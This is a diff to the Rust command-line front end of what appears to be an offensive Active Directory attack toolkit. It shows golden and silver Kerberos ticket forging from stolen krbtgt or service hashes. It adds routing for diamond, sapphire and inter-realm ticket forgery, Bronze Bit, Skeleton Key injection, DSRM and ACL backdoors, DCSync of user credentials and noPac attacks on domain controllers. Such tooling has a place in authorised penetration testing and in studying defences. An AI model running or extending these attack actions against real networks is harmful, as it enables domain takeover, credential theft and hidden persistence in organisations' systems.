@@ -21,6 +21,8 @@ use overthrone_crawler::{CrawlerConfig, run_crawler};
 use overthrone_reaper::laps::enumerate_laps;
 #[cfg(feature = "reaper")]
 use overthrone_reaper::runner::ReaperConfig;
+#[cfg(feature = "forge")]
+use overthrone_forge::runner::{run_forge, ForgeConfig, ForgeAction as RunnerForgeAction};
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use tracing::warn;
@@ -854,7 +856,6 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
                 &krbtgt_hash[..8.min(krbtgt_hash.len())].cyan()
             );
 
-            // Hex decode krbtgt hash
             let krbtgt_key = match hex::decode(krbtgt_hash) {
                 Ok(k) => k,
                 Err(e) => {
@@ -874,7 +875,7 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
                 user,
                 *rid,
                 &krbtgt_key,
-                23, // ETYPE_RC4_HMAC
+                23,
             ) {
                 Ok(tgt) => tgt.ticket.build(),
                 Err(e) => {
@@ -915,7 +916,6 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
                 &service_hash[..8.min(service_hash.len())].cyan()
             );
 
-            // Hex decode service hash
             let s_key = match hex::decode(service_hash) {
                 Ok(k) => k,
                 Err(e) => {
@@ -930,7 +930,7 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             }
 
             let ticket_bytes = match overthrone_core::proto::kerberos::forge_service_ticket(
-                &domain, domain_sid, user, *rid, spn, &s_key, 23, // ETYPE_RC4_HMAC
+                &domain, domain_sid, user, *rid, spn, &s_key, 23,
             ) {
                 Ok(tgs) => tgs.ticket.build(),
                 Err(e) => {
@@ -947,7 +947,167 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             banner::print_success(&format!("Silver ticket saved to: {}", output));
             0
         }
+        _ => run_forge_action(cli, &domain, action).await,
     }
+}
+
+/// Route non-trivial forge actions through the forge runner.
+#[cfg(feature = "forge")]
+#[allow(clippy::too_many_lines)]
+async fn run_forge_action(cli: &Cli, domain: &str, action: &ForgeAction) -> i32 {
+    let (runner_action, opts) = match build_runner_action(domain, action) {
+        Ok(v) => v,
+        Err(e) => {
+            eprintln!("[!] {e}");
+            return 1;
+        }
+    };
+
+    let config = ForgeConfig {
+        dc_ip: cli.dc_host.clone().unwrap_or_default(),
+        domain: domain.to_string(),
+        username: cli.username.clone().unwrap_or_default(),
+        password: cli.password.clone(),
+        nt_hash: cli.nt_hash.clone(),
+        action: runner_action,
+        krbtgt_hash: opts.get("krbtgt_hash").cloned(),
+        krbtgt_aes256: opts.get("krbtgt_aes256").cloned(),
+        service_hash: opts.get("service_hash").cloned(),
+        domain_sid: opts.get("domain_sid").cloned(),
+        impersonate: opts.get("user").cloned(),
+        user_rid: opts.get("rid").and_then(|r| r.parse().ok()).unwrap_or(0),
+        group_rids: vec![],
+        extra_sids: vec![],
+        lifetime_hours: 0,
+        output_path: opts.get("output").cloned(),
+        payload_path: opts.get("payload_path").cloned(),
+        skeleton_master_password: opts.get("master_password").cloned(),
+        pkinit_cert_path: cli.pkinit_cert.clone(),
+        pkinit_key_path: cli.pkinit_key.clone(),
+        dry_run: cli.dry_run,
+    };
+
+    match run_forge(&config).await {
+        Ok(result) => {
+            if matches!(cli.stdout_format, OutputFormat::Json) {
+                let json = serde_json::to_string_pretty(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"));
+                println!("{json}");
+                if let Some(path) = &cli.outfile
+                    && let Err(e) = std::fs::write(path, &json)
+                {
+                    eprintln!("warn: failed to write output file '{}': {}", path, e);
+                }
+                return if result.success { 0 } else { 1 };
+            }
+
+            if result.success {
+                banner::print_success(&result.message);
+                if let Some(ref ticket) = result.ticket_data {
+                    println!(
+                        "    {}: {} as {}",
+                        "Ticket".bold(),
+                        ticket.ticket_type.as_str().cyan(),
+                        ticket.impersonated_user.as_str().yellow()
+                    );
+                    if !ticket.valid_from.is_empty() || !ticket.valid_until.is_empty() {
+                        println!(
+                            "    {}: {} -> {}",
+                            "Valid".bold(),
+                            ticket.valid_from.as_str().green(),
+                            ticket.valid_until.as_str().green()
+                        );
+                    }
+                    if let Some(ref path) = ticket.kirbi_path {
+                        println!("    {}: {}", "Saved".bold(), path.white());
+                    }
+                }
+                0
+            } else {
+                banner::print_fail(&result.message);
+                1
+            }
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Forge failed: {e}"));
+            1
+        }
+    }
+}
+
+/// Build a forge runner action from the CLI action variant.
+#[cfg(feature = "forge")]
+fn build_runner_action(_domain: &str, action: &ForgeAction) -> Result<(RunnerForgeAction, std::collections::HashMap<String, String>), String> {
+    use std::collections::HashMap;
+    let mut opts = HashMap::new();
+    let runner_action = match action {
+        ForgeAction::Diamond { domain_sid, user, rid, krbtgt_hash, krbtgt_aes256, output } => {
+            opts.insert("user".to_string(), user.clone());
+            opts.insert("rid".to_string(), rid.to_string());
+            opts.insert("domain_sid".to_string(), domain_sid.clone());
+            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
+            if let Some(aes) = krbtgt_aes256 {
+                opts.insert("krbtgt_aes256".to_string(), aes.clone());
+            }
+            opts.insert("output".to_string(), output.clone());
+            RunnerForgeAction::DiamondTicket
+        }
+        ForgeAction::Sapphire { domain_sid, user, output } => {
+            opts.insert("user".to_string(), user.clone());
+            opts.insert("domain_sid".to_string(), domain_sid.clone());
+            opts.insert("output".to_string(), output.clone());
+            RunnerForgeAction::SapphireTicket
+        }
+        ForgeAction::BronzeBit { spn, output } => {
+            opts.insert("output".to_string(), output.clone());
+            RunnerForgeAction::BronzeBit { target_spn: spn.clone() }
+        }
+        ForgeAction::InterRealmTgt { target_domain, domain_sid, krbtgt_hash, output } => {
+            opts.insert("domain_sid".to_string(), domain_sid.clone());
+            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
+            opts.insert("output".to_string(), output.clone());
+            RunnerForgeAction::InterRealmTgt { target_domain: target_domain.clone() }
+        }
+        ForgeAction::SkeletonKey { payload_path, master_password } => {
+            if let Some(p) = payload_path {
+                if !std::path::Path::new(p).exists() {
+                    return Err(format!("payload_path '{}' does not exist", p));
+                }
+                opts.insert("payload_path".to_string(), p.clone());
+            }
+            opts.insert("master_password".to_string(), master_password.clone());
+            RunnerForgeAction::SkeletonKey
+        }
+        ForgeAction::DsrmBackdoor { domain_sid, krbtgt_hash } => {
+            opts.insert("domain_sid".to_string(), domain_sid.clone());
+            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
+            RunnerForgeAction::DsrmBackdoor
+        }
+        ForgeAction::DcSyncUser { user } => {
+            opts.insert("user".to_string(), user.clone());
+            RunnerForgeAction::DcSyncUser { target_user: user.clone() }
+        }
+        ForgeAction::AclBackdoor { target_dn, trustee } => {
+            opts.insert("target_dn".to_string(), target_dn.clone());
+            opts.insert("trustee".to_string(), trustee.clone());
+            RunnerForgeAction::AclBackdoor { target_dn: target_dn.clone(), trustee: trustee.clone() }
+        }
+        ForgeAction::NoPac { target_dc } => {
+            RunnerForgeAction::NoPac { target_dc: target_dc.clone() }
+        }
+        ForgeAction::ConvertTicket { input, format } => {
+            opts.insert("input".to_string(), input.clone());
+            opts.insert("format".to_string(), format.clone());
+            RunnerForgeAction::ConvertTicket {
+                input_path: input.clone(),
+                output_format: format.clone(),
+            }
+        }
+        _ => {
+            return Err("unexpected ForgeAction variant in build_runner_action (Golden/Silver should be handled before routing)".to_string());
+        }
+    };
+    Ok((runner_action, opts))
 }
 
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
@@ -3820,11 +3980,11 @@ pub async fn cmd_scan(
                             res.supported_sasl_mechs.join(", ").yellow()
                         );
                     }
-                    if !res.naming_contexts.is_empty() {
+                    if let Some(nc) = res.naming_contexts.first() {
                         println!(
                             "    {} Naming Contexts: {}",
                             ">".bright_black(),
-                            res.naming_contexts.first().unwrap().cyan()
+                            nc.cyan()
                         );
                     }
                 }
